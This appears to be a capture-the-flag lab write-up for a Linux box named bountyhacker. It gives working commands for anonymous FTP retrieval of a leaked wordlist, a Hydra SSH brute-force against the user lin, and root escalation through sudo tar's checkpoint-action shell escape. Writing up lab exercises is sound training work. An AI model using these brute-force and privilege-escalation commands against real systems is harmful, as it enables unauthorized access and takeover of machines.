@@ -1,0 +1,80 @@
+
+OS: Linux
+Date: 08.10.2026
+
+1. Reconnaissance
+
+Nmap scan:
+
+nmap -sV -sC -p- <IP>
+
+Open ports:
+
+21 (FTP)  — vsftpd (anonymous login allowed)
+22 (SSH)  — OpenSSH
+80 (HTTP) — Apache httpd
+2. Enumeration
+
+FTP anonymous login:
+
+ftp <IP>
+# user: anonymous
+# password: (any)
+
+Found two files: locks.txt and task.txt. Download both:
+
+get locks.txt
+get task.txt
+
+task.txt contains a to-do note referencing a user named lin, including a reminder about password policy — a hint that locks.txt is a password wordlist meant for brute-forcing that user’s login.
+
+locks.txt turns out to be a list of candidate passwords.
+
+Web (port 80): standard Apache default page, no immediately useful leads — the FTP files are the real path forward.
+
+3. Exploitation
+
+SSH brute force with Hydra, using the leaked wordlist against the username found in the note:
+
+hydra -l lin -P locks.txt ssh://<IP>
+
+Credentials found:
+
+Username: lin
+Password: (cracked from locks.txt)
+
+Login:
+
+ssh lin@<IP>
+4. Privilege Escalation
+
+Check sudo rights:
+
+sudo -l
+
+Result:
+
+User lin may run the following commands on bountyhacker:
+    (root) /usr/bin/tar
+
+tar run as root with no restrictions is a classic GTFOBins privilege escalation vector:
+
+sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+This spawns a root shell.
+
+5. Flags
+
+User flag:
+
+cat /home/lin/user.txt
+
+Root flag:
+
+cat /root/root.txt
+6. Lessons Learned
+Anonymous FTP — again a classic entry point for leaking credentials/wordlists.
+Operational notes (task.txt) can leak usernames and hint at where a wordlist should be aimed.
+Hydra + a small custom wordlist beats rockyou.txt when the target has effectively leaked their own password list.
+sudo -l — always the first privesc check.
+tar with unrestricted root sudo rights is a textbook GTFOBins shell escape.
